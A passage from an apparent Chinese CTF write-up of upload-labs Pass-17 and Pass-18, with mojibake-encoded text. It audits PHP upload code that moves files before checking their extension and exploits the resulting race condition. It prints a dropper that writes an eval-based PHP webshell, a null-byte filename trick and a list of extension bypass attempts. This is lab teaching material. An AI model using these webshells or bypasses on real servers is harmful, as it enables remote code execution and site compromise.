å‡æµ‹è¯•å¤±è´¥ã€‚</p><p>åˆ†æå¯èƒ½é‡‡ç”¨çš„ç™½åå•ã€‚å¦‚æœæ˜¯ç™½åå•é™åˆ¶å¹¶ä¸”æ²¡æœ‰å¯åˆ©ç”¨çš„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè™½ç„¶èƒ½å¤Ÿä¸Šä¼ å›¾ç‰‡æœ¨é©¬ä½†ä¹Ÿæ— æ³•è§£ææ‰§è¡Œã€‚</p><ul><li>æç¤º</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2011.02.49.png" style="zoom:50%;"><p>æç¤ºï¼šéœ€è¦ä»£ç å®¡è®¡ã€‚é‚£å°±åˆ†æä¸€ä¸‹ä»£ç å§ã€‚</p><h2 id="17-3-ä»£ç å®¡è®¡"><a href="#17-3-ä»£ç å®¡è®¡" class="headerlink" title="17.3 ä»£ç å®¡è®¡"></a>17.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span><span class="token punctuation">;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="ä»£ç æ¦‚è¿°ï¼š"><a href="#ä»£ç æ¦‚è¿°ï¼š" class="headerlink" title="ä»£ç æ¦‚è¿°ï¼š"></a>ä»£ç æ¦‚è¿°ï¼š</h4><ol><li><strong>åˆå§‹åŒ–å˜é‡</strong>ï¼š<ul><li><code>$is_upload</code>ï¼šç”¨äºæ ‡è®°æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸï¼Œåˆå§‹å€¼ä¸º <code>false</code>ã€‚</li><li><code>$msg</code>ï¼šç”¨äºå­˜å‚¨æç¤ºä¿¡æ¯ï¼Œåˆå§‹å€¼ä¸º <code>null</code>ã€‚</li></ul></li><li><strong>æ£€æŸ¥è¡¨å•æäº¤</strong>ï¼š<ul><li>é€šè¿‡ <code>isset($_POST['submit'])</code> åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç‚¹å‡»äº†æäº¤æŒ‰é’®ã€‚</li></ul></li><li><strong>å®šä¹‰å…è®¸çš„æ–‡ä»¶æ‰©å±•å</strong>ï¼š<ul><li><code>$ext_arr = array('jpg','png','gif');</code>ï¼šå…è®¸ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•ååˆ—è¡¨ã€‚</li></ul></li><li><strong>è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯</strong>ï¼š<ul><li><code>$file_name</code>ï¼šè·å–ä¸Šä¼ æ–‡ä»¶çš„åŸå§‹æ–‡ä»¶åã€‚</li><li><code>$temp_file</code>ï¼šè·å–ä¸Šä¼ æ–‡ä»¶çš„ä¸´æ—¶è·¯å¾„ã€‚</li></ul></li><li><strong>æå–æ–‡ä»¶æ‰©å±•å</strong>ï¼š<ul><li>ä½¿ç”¨ <code>strrpos</code> å’Œ <code>substr</code> ä»æ–‡ä»¶åä¸­æå–æ–‡ä»¶æ‰©å±•åã€‚</li></ul></li><li><strong>è®¾ç½®ä¸Šä¼ è·¯å¾„</strong>ï¼š<ul><li><code>$upload_file</code>ï¼šå°†æ–‡ä»¶ä¿å­˜åˆ°æŒ‡å®šç›®å½•ï¼ˆ<code>UPLOAD_PATH</code>ï¼‰ä¸‹ã€‚</li></ul></li><li><strong>ç§»åŠ¨ä¸´æ—¶æ–‡ä»¶åˆ°ç›®æ ‡è·¯å¾„</strong>ï¼š<ul><li>ä½¿ç”¨ <code>move_uploaded_file</code> å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°ç›®æ ‡è·¯å¾„ã€‚</li></ul></li><li><strong>æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åˆæ³•</strong>ï¼š<ul><li>ä½¿ç”¨ <code>in_array</code> åˆ¤æ–­æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨å…è®¸çš„åˆ—è¡¨ä¸­ã€‚</li><li>å¦‚æœåˆæ³•ï¼š<ul><li>ç”Ÿæˆä¸€ä¸ªæ–°çš„æ–‡ä»¶åï¼š<code>rand(10, 99) . date("YmdHis") . "." . $file_ext</code>ï¼Œç¡®ä¿æ–‡ä»¶åå”¯ä¸€ã€‚</li><li>ä½¿ç”¨ <code>rename</code> å°†æ–‡ä»¶é‡å‘½åä¸ºæ–°æ–‡ä»¶åã€‚</li><li>è®¾ç½® <code>$is_upload = true;</code>ï¼Œè¡¨ç¤ºä¸Šä¼ æˆåŠŸã€‚</li></ul></li><li>å¦‚æœä¸åˆæ³•ï¼š<ul><li>è®¾ç½®æç¤ºä¿¡æ¯ï¼š<code>$msg = "åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼";</code>ã€‚</li><li>ä½¿ç”¨ <code>unlink</code> åˆ é™¤å·²ä¸Šä¼ çš„æ–‡ä»¶ã€‚</li></ul></li></ul></li><li><strong>å¤„ç†ä¸Šä¼ é”™è¯¯</strong>ï¼š<ul><li>å¦‚æœ <code>move_uploaded_file</code> å¤±è´¥ï¼Œè®¾ç½®æç¤ºä¿¡æ¯ï¼š<code>$msg = 'ä¸Šä¼ å‡ºé”™ï¼';</code>ã€‚</li></ul></li></ol><h4 id="é€è¡Œè§£æï¼š"><a href="#é€è¡Œè§£æï¼š" class="headerlink" title="é€è¡Œè§£æï¼š"></a>é€è¡Œè§£æï¼š</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// æ ‡è®°æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸ</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span> <span class="token comment">// ç”¨äºå­˜å‚¨æç¤ºä¿¡æ¯</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// æ£€æŸ¥è¡¨å•æ˜¯å¦æäº¤</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å…è®¸çš„æ–‡ä»¶æ‰©å±•å</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// è·å–ä¸Šä¼ æ–‡ä»¶çš„åŸå§‹æ–‡ä»¶å</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// è·å–ä¸Šä¼ æ–‡ä»¶çš„ä¸´æ—¶è·¯å¾„</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æå–æ–‡ä»¶æ‰©å±•å</span>    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span> <span class="token comment">// è®¾ç½®ä¸Šä¼ è·¯å¾„</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// ç§»åŠ¨ä¸´æ—¶æ–‡ä»¶åˆ°ç›®æ ‡è·¯å¾„</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åˆæ³•</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"."</span> <span class="token operator">.</span> <span class="token variable">$file_ext</span><span class="token punctuation">;</span> <span class="token comment">// ç”Ÿæˆå”¯ä¸€æ–‡ä»¶å</span>            <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// é‡å‘½åæ–‡ä»¶</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// æ ‡è®°ä¸Šä¼ æˆåŠŸ</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span><span class="token punctuation">;</span> <span class="token comment">// è®¾ç½®æç¤ºä¿¡æ¯</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åˆ é™¤å·²ä¸Šä¼ çš„æ–‡ä»¶</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span> <span class="token comment">// è®¾ç½®ä¸Šä¼ é”™è¯¯æç¤º</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="é—®é¢˜åˆ†æï¼š"><a href="#é—®é¢˜åˆ†æï¼š" class="headerlink" title="é—®é¢˜åˆ†æï¼š"></a>é—®é¢˜åˆ†æï¼š</h4><p>å…ˆç§»åŠ¨ä¸´æ—¶æ–‡ä»¶åˆ°ç›®æ ‡è·¯å¾„ç„¶åæ‰æ£€æµ‹æ–‡ä»¶åçš„åˆæ³•æ€§ï¼Œä¸åˆæ³•æ‰ä¼šåˆ é™¤ï¼Œ å¯èƒ½å­˜åœ¨<code>æ¡ä»¶ç«äº‰</code>çš„éšæ‚£ã€‚æˆ‘ä»¬åªè¦èƒ½èµ¶åœ¨æœåŠ¡å™¨ä½¿ç”¨unlinkåˆ é™¤æ–‡ä»¶ä¹‹å‰ï¼Œè®¿é—®æˆ‘ä»¬çš„phpè„šæœ¬ä½¿å…¶è§£ææ‰§è¡Œï¼Œå¹¶åœ¨æœåŠ¡ç«¯åˆ›å»ºä¸€ä¸ªwebshellï¼Œåç»­å°±å¯ä»¥ç”¨èšå‰‘getshelläº†ã€‚</p></blockquote><ul><li>å°è¯•00æˆªæ–­</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yjh.php%00.jpg substrå’Œstrrpos å‡½æ•°ç¢°åˆ°ç©ºå­—èŠ‚ä¹‹åä¸å¤„ç†ï¼Œæå–åˆ°çš„åç¼€åè¿˜æ˜¯phpyjh.jpg%00.phpè™½ç„¶èƒ½ç»•è¿‡åç¼€åæ£€æµ‹ï¼Œä½†æœ€ç»ˆä¿å­˜çš„è¿˜æ˜¯jpgæ–‡ä»¶ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2012.31.15.png" style="zoom:50%;"><h2 id="17-4-æ¡ä»¶ç«äº‰ç»•è¿‡"><a href="#17-4-æ¡ä»¶ç«äº‰ç»•è¿‡" class="headerlink" title="17.4 æ¡ä»¶ç«äº‰ç»•è¿‡"></a>17.4 æ¡ä»¶ç«äº‰ç»•è¿‡</h2><p>å…ˆç§»åŠ¨ä¸´æ—¶æ–‡ä»¶åˆ°ç›®æ ‡è·¯å¾„ç„¶åæ‰æ£€æµ‹æ–‡ä»¶åçš„åˆæ³•æ€§ï¼Œä¸åˆæ³•æ‰ä¼šåˆ é™¤ï¼Œ å¯èƒ½å­˜åœ¨<code>æ¡ä»¶ç«äº‰</code>çš„éšæ‚£ã€‚æˆ‘ä»¬åªè¦èƒ½èµ¶åœ¨æœåŠ¡å™¨ä½¿ç”¨unlinkåˆ é™¤æ–‡ä»¶ä¹‹å‰ï¼Œè®¿é—®æˆ‘ä»¬çš„phpè„šæœ¬ä½¿å…¶è§£ææ‰§è¡Œï¼Œå¹¶åœ¨æœåŠ¡ç«¯åˆ›å»ºä¸€ä¸ªwebshellï¼Œåç»­å°±å¯ä»¥ç”¨èšå‰‘getshelläº†ã€‚</p><p>å¤šçº¿ç¨‹å¹¶å‘ä¸Šä¼ <code>create_webshell.php</code>ï¼Œèµ¶åœ¨è¯¥æ–‡ä»¶è¢«åˆ é™¤å‰ï¼Œå¤šçº¿ç¨‹å¹¶å‘è®¿é—®create_webshell.phpï¼Œè§¦å‘è„šæœ¬æ‰§è¡Œåœ¨æœåŠ¡ç«¯åˆ›å»ºwebshellã€‚</p><ul><li>åˆ›å»ºä¸€ä¸ªphpè„šæœ¬ <code>create_webshell.php</code>ï¼š</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'yjh.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST["sxk"])?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="ä»£ç è§£æï¼š"><a href="#ä»£ç è§£æï¼š" class="headerlink" title="ä»£ç è§£æï¼š"></a>ä»£ç è§£æï¼š</h4><ul><li><code>fopen('yjh.php', 'w')</code>ï¼šä»¥å†™å…¥æ¨¡å¼æ‰“å¼€ï¼ˆæˆ–åˆ›å»ºï¼‰åä¸º <code>yjh.php</code> çš„æ–‡ä»¶ã€‚æ¨¡å¼ <code>'w'</code> ä¼šæ¸…ç©ºæ–‡ä»¶å†…å®¹ï¼ˆå¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼‰ã€‚</li><li><code>fputs(..., '&lt;?php @eval($_POST["sxk"])?&gt;')</code>ï¼šå‘è¯¥æ–‡ä»¶å†™å…¥ä»¥ä¸‹å†…å®¹ï¼š</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"sxk"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>æœ€ç»ˆç”Ÿæˆçš„æ–‡ä»¶ <code>yjh.php</code> æ˜¯ä¸€ä¸ª <strong>Webshell</strong>ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ HTTP POST å‚æ•° <code>sxk</code> æ‰§è¡Œä»»æ„ PHP ä»£ç ã€‚</li></ul></blockquote><ul><li>æ–‡ä»¶ä¸Šä¼ çº¿ç¨‹</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2012.44.28.png" alt="å¹¶å‘ä¸Šä¼ " style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2012.44.48.png" style="zoom:50%;"><ul><li>æ–‡ä»¶è®¿é—®çº¿ç¨‹</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2012.47.30.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2012.47.49.png" style="zoom:50%;"><ul><li>æ‰§è¡Œç»“æœ</li></ul><p>ç‚¹å‡»æ‰§è¡Œå¹¶å‘ä¸Šä¼ è¯·æ±‚ä¹‹åï¼Œç‚¹å‡»å¹¶å‘è®¿é—®è¯·æ±‚ï¼ŒæˆåŠŸè§¦å‘è„šæœ¬ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2012.48.41.png" style="zoom:50%;"><p>ä½†æ˜¯æ²¡æœ‰æ‰§è¡ŒæˆåŠŸã€‚</p><p>ä¿®æ”¹é…ç½®ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2012.53.21.png" style="zoom:50%;"><p>é‡å¤æ“ä½œï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸä¸Šä¼ äº†<code>yjh.php</code>æœ¨é©¬ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2012.54.16.png" style="zoom:50%;"><ul><li>èšå‰‘getshell</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2012.56.01.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2012.56.30.png" style="zoom:50%;"><h1 id="åå…«ã€Pass-18-ï¼ˆç™½åå•-apache-7zè§£ææ¼æ´-æ¡ä»¶ç«äº‰ï¼‰"><a href="#åå…«ã€Pass-18-ï¼ˆç™½åå•-apache-7zè§£ææ¼æ´-æ¡ä»¶ç«äº‰ï¼‰" class="headerlink" title="åå…«ã€Pass-18***ï¼ˆç™½åå•-apache 7zè§£ææ¼æ´+æ¡ä»¶ç«äº‰ï¼‰"></a>åå…«ã€Pass-18***ï¼ˆç™½åå•-apache 7zè§£ææ¼æ´+æ¡ä»¶ç«äº‰ï¼‰</h1><h2 id="18-1-é¢˜é¢"><a href="#18-1-é¢˜é¢" class="headerlink" title="18.1 é¢˜é¢"></a>18.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2015.20.29.png" style="zoom:50%;"><h2 id="18-2-è§£é¢˜"><a href="#18-2-è§£é¢˜" class="headerlink" title="18.2 è§£é¢˜"></a>18.2 è§£é¢˜</h2><ul><li>ä¸Šä¼ yjh.php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2015.21.49.png" style="zoom:50%;"><ul><li>æŠ“åŒ…</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2015.22.59.png" style="zoom:50%;"><ul><li>æ¢æµ‹æ£€æµ‹æ–¹æ³•</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2015.25.06.png" style="zoom:50%;"><p>ä»…ä»…ä¿®æ”¹åç¼€.jpgèƒ½å¤Ÿä¸Šä¼ æˆåŠŸ=&gt;æ²¡æœ‰æ£€æµ‹MIMEç±»å‹&amp;&amp;æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å†…å®¹ã€‚</p><ul><li>å°è¯•åç¼€åå¸¸è§„ç»•è¿‡æ–¹æ³•</li></ul><p>èƒ½å¤ŸæˆåŠŸä¸Šä¼ çš„åç¼€åï¼š</p><p>1ï¼‰.jPG </p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2015.27.47.png" style="zoom:50%;"><p>2ï¼‰.Gif</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2015.29.00.png" style="zoom:50%;"><p>æ²¡æœ‰é™åˆ¶å¿…é¡»æ˜¯å°å†™çš„åç¼€åã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2015.30.33.png" style="zoom:50%;"><p>ä¸èƒ½æˆåŠŸä¸Šä¼ çš„åç¼€åï¼š</p><p>1ï¼‰.Php</p><p>2ï¼‰.Htaccess</p><p>3ï¼‰.phpç©ºæ ¼</p><p>4ï¼‰.php.</p><p>5ï¼‰.php. .</p><p>6ï¼‰.php::$DATA</p><p>åˆ†æï¼šå¯èƒ½æ˜¯åç¼€åç™½åå•ï¼Œæ²¡æœ‰é™åˆ¶åˆæ³•æ–‡ä»¶å(jpg gif png)å¿…é¡»ä¸ºå°å†™ã€‚</p><p>å›¾ç‰‡æœ¨é©¬èƒ½å¤Ÿä¸Šä¼ ï¼Œä½†æ˜¯æ²¡æœ‰æ–‡ä»¶åŒ…å«æ¼æ´æ— æ³•è§£æåˆ©ç”¨ã€‚</p><ul><li>æç¤º</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-30%2015.37.46.png" style="zoom:50%;"><ul><li>ä»£ç å®¡è®¡</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//index.php</span><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./myupload.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$imgFileName</span> <span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span 